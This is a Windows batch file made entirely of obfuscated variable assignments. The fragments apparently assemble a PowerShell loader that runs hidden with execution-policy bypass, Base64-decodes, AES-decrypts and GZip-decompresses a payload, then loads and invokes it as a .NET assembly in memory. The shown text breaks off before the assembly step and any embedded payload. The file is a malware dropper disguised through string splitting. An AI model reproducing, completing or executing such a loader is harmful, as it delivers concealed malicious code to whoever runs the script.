@echo off
set "woIiNHrOXE=ewLi"
set "HaucQomRFt=e]::"
set "KxngYzAIfE=3); "
set "XinfEdHgIK=urit"
set "WGghIlrqxP=ect "
set "UnJrqNdLnG='0Pg"
set "GSCAveYrlk=oin "
set "qIIYMoGhLi=kNf "
set "YjNGwInmHE=tem."
set "NTxQhjGWWK=PxEW"
set "DWTUiORCOw=ddin"
set "bJIQMrbHkL=O = "
set "IULduJRtYe=yste"
set "bkOSKWTSFv= [Sy"
set "TnXSfFGbbS=();$"
set "SXLVcovoWQ=oryS"
set "UzCNWYekNi=stem"
set "ykjAceyfzM=ring"
set "TSUcfFJWJO=.Mod"
set "RWXTIHeOdY=Invo"
set "NkbXfsBlUG=('Tg"
set "igrqABncXW=Obje"
set "XdwPcerrlr=m.Re"
set "VUdMpRDQDy=UnWj"
set "yzgxhYKUxl=$mog"
set "kvBsvAvdqh=]::("
set "gOEOFNWliW=gsYZ"
set "qnkiXiCuFK=join"
set "aQKCVxIFeL=ode]"
set "TsNtbCBUOJ=);$x"
set "ZtYMCwInja=;$nE"
set "gggRIzRtCh=esMa"
set "pXctXmLdcS=ew-O"
set "pklLRYZHSJ=tryP"
set "idROaXioGW=rz ="
set "rcdcJmWFhn=('da"
set "ZReBzpfswX=join"
set "lTyHvCBmzs=ionM"
set "thqxitlNBk=eMVs"
set "uDSHAgrRKC=.Con"
set "VXXQMUndzy=Obje"
set "eCYYYfNdCO=y.Ci"
set "HlYavubyER=p = "
set "UKoQbDLNJo=pose"
set "BeMHtdRmzP=gth)"
set "DWSISITnUa=yste"
set "wXdofKdaPa=l5E7"
set "FcicXrKbuX=rtS4"
set "pMxSuWiLvD=null"
set "AUxeBZImVk=ateD"
set "swNgOzwOut=rans"
set "mSswfQWjve=oL'["
set "qXfYzDYySr=..-1"
set "WKcktssVKA=vzd "
set "uaEKTJUwQU=Secu"
set "xfcgCKOZqm=zd.T"
set "UYAGIIyrpk=rofi"
set "SkpXaUXQQU='txe"
set "KDlmJIySIk=-ep "
set "JUeTXNWjrL=trea"
set "DMpLlgGsnx=$xLG"
set "wzmvYVOPIJ=brea"
set "YXGpWPpHvm=mogj"
set "arGohZimcE=bstr"
set "kGOhfdewfl=New-"
set "RNemANaTZE=Star"
set "YFqxeKwbox=m.IO"
set "QlnMFpxWYi=Bmor"
set "yWqvhBDQxW=ing("
set "fFBVejJspT=);$t"
set "ZYRYnavBfU= [Sy"
set "xLiufMRUDD=)($m"
set "IOmRSgRtmT=th('"
set "eXhLiSPMyK=.Com"
set "UcMmoByHRL=n ''"
set "ToounCBRdT=utRM"
set "MACzRGmpen= = N"
set "keLbPlLnjz=V = "
set "jsfDCqsdDg=tsWi"
set "WNOxgcGWIT=pStr"
set "AhvncuDmoL=('%*'"
set "jbJNbQOrvS=pher"
set "lbwugjqlJn=rz.T"
set "PvjIeBWlyq=LGrz"
set "aIfUtrYdES=ment"
set "eeuBOjCYzN=am;$"
set "LIFmMMnOYx=bypa"
set "hJMxbahBzT=);$m"
set "VhELuiqZlI=utRM"
set "piexNKPVvS=jp);"
set "rUjkEIpzgM= [st"
set "rMbjsLJToy=morF"
set "qlnNOAWQkk=();$"
set "prnueFOoJl=lO.D"
set "KkmPeGFOYL==');"
set "XgHQryeOiz=yTo("
set "prWpawvjdf=-joi"
set "VHHgrtTBQa=ZBXV"
set "XuOZQZxMNM='[-1"
set "JVKwgmbbVG=g = "
set "RcbbLqrkUu=tem."
set "QboihJLtZH=tS46"
set "NCJfDVCISL=$mut"
set "qSQeZSFYCY=$xLG"
set "xLJJqEhZkL=ne);"
set "xpmAhezSNc=.Cry"
set "sovoRIKKXQ=tpjl"
set "gEmaLUVUVR=Comp"
set "SiIBxEsydB=fore"
set "uGjlabzJuq=em.C"
set "FOECoWlduu=pose"
set "mxtJleyqTn=k; }"
set "UpVreteHrD=ddin"
set "JDzWskNcEL=.GZi"
set "WAytxIqdiP=n ''"
set "IvutGStzMk=.Ass"
set "OWHFCScQNG=BC;$"
set "vgSZAJqMov=ptor"
set "LiSsqzSYcl=M.En"
set "SNGXSXoWqb=1] -"
set "MjBHYfBQnr=y.Cr"
set "VQpOoWEtBP== [S"
set "oTKwxQnaqE=in $"
set "lWMexrMoWa=comm"
set "SUxtjCZkuM=ptog"
set "QILaTUPlxN=-1.."
set "SBOAwzPvJW= New"
set "zeEzqhigcC=YxVw"
set "vPiTjtHdJP= '')"
set "spaQoGaZOM=M.Pa"
set "sPRdneZfQv=6] -"
set "UoTzudJMBQ=:('g"
set "MxrRsbRhFw=s75K"
set "HzBdjtUlDi=-nop"
set "eJFUbebLpS=$vXC"
set "SFWYwgdMZs=zuZI"
set "LCrbjTQiEi===')"
set "hzbyTCkgAV=-4] "
set "QjsEcyEPsT=ose("
set "akfauEhIzc=($TZ"
set "HqBmtbjEov=tem."
set "aneEyPCocg=PTtG"
set "OTKVsfiYzz=le  "
set "ztszqKpAGi=[]] "
set "YBXlizzGKi=vzd."
set "MOhOKneEVT=jp ="
set "bOLaOxperA=f.Su"
set "SFQZlnmrkT=ion."
set "TrhnqSYToI=raph"
set "FYdiMdrLGF=rity"
set "lRgdqcAnuu=  $K"
set "xmXsdIWtjK=.Sec"
set "VMlUqUbfII=..-1"
set "YyFFeiHHDE=gnir"
set "RbjgrCEojx=::De"
set "onPwhalBEx=ZBXV"
set "uKoLZOzhnP=iron"
set "LmLEvpXGGq=rity"
set "HzWGhPzkXg=;$UE"
set "xCJusiMRta=form"
set "OKoFtGRKkn=nage"
set "nrhJiOycfh=] -j"
set "URhBtqdZHn=ptog"
set "CApzaNWnyZ=Syst"
set "kFJfzgnyjG=and "
set "nudQIuJvnJ=TZkN"
set "pYxvXRgcxE=Disp"
set "cMEzsxsoiG=ecry"
set "jBSqNuOvwI=16] "
set "TeGtbeWnyp=d;$m"
set "wWvaIOPgwh=zHhH"
set "eesCqOMpnj=tion"
set "qEpJOutrVf=p, 0"
set "ptNGvMqesb=saBm"
set "eRpctypgDX=]::("
set "PdeeordluG=oint"
set "AosQhOCHPp=ispo"
set "asesMggdeS=gMod"
set "pTVsILJrUr=ADa."
